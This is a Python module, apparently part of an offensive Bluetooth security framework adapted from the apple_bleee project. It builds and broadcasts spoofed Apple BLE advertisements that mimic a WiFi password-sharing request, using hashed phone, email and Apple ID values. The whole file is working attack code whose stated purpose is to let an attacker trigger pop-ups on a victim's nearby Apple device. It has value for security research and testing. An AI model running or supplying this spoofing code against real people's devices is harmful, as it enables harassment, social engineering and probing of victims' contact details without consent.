# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
from modules._module import Module
from utils.custom_print import print_info, print_ok, print_error, print_body
from utils.check_root import is_root
from utildata.dataset_options import Option
import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Advertising Wifi",
                       "Description": "This script sends BLE messages with WiFi password sharing request. This PoC shows that an attacker can trigger a pop up message on the target device if he/she knows any phone/email that exists on the victim's device",
                       "privileges": "root",
                       "OS": "Linux",
                       "Reference" : "https://github.com/hexway/apple_bleee",
                       "Author": "@lucferbux"}

        options = {
            'ssid': Option.create(name="random", required=True, description="WiFi SSID (example: test)"),
            'phone': Option.create(name="phone", value='none', description="Phone number (example: 39217XXX514)"),
            'email': Option.create(name="email", value='none', description="Email address (example: test@test.com)"),
            'appleid': Option.create(name="appleid", value='none', description="AppleID"),
            'ble_iface': Option.create(name="ble_iface", value=0, description="Bluetooth inteface"),
            'interval': Option.create(name="inverval", value=200, description="Advertising interval")
        }

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    @is_root
    def run(self):
        """Creates the wifi advertisement with the given ssid, and phone or email
        """
        ssid = self.args.get("ssid", 'none')
        phone = self.args.get("phone", 'none')
        email = self.args.get("email", 'none')
        appleid = self.args.get("appleid", 'none')
        interval = int(self.args.get("interval", 200))
        dev_id = int(self.args.get("ble_iface", 0))

        toggle_device(dev_id, True)

        header = (0x02, 0x01, 0x1a, 0x1a, 0xff, 0x4c, 0x00)
        const1 = (0x0f, 0x11, 0xc0, 0x08)
        id1 = (0xff, 0xff, 0xff)
        contact_id_mail = self.get_hash(email)
        contact_id_tel = self.get_hash(phone)
        contact_id_appleid = self.get_hash(appleid)
        id_wifi = self.get_hash(ssid)
        const2 = (0x10, 0x02, 0x0b, 0x0c,)
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print_error(f"Cannot open bluetooth device {dev_id}")
            return

        try:
            print_info("Start advertising press ctrl + c to quit...")
            start_le_advertising(sock, adv_type=0x00, min_interval=interval, max_interval=interval, data=(
                        header + const1 + id1 + contact_id_appleid + contact_id_tel + contact_id_mail + id_wifi + const2))
            while True:
                sleep(2)    
        except:
            stop_le_advertising(sock)

    def get_hash(self, data, size=3):
        """Get hash of the given data
        
        Args:
            data (string): Data to convert
            size (int, optional): Size of the portion of the hash obtained. Defaults to 3.
        
        Returns:
            byte: Hash obtained
        """
        return tuple(bytearray.fromhex(hashlib.sha256(data.encode('utf-8')).hexdigest())[:size])
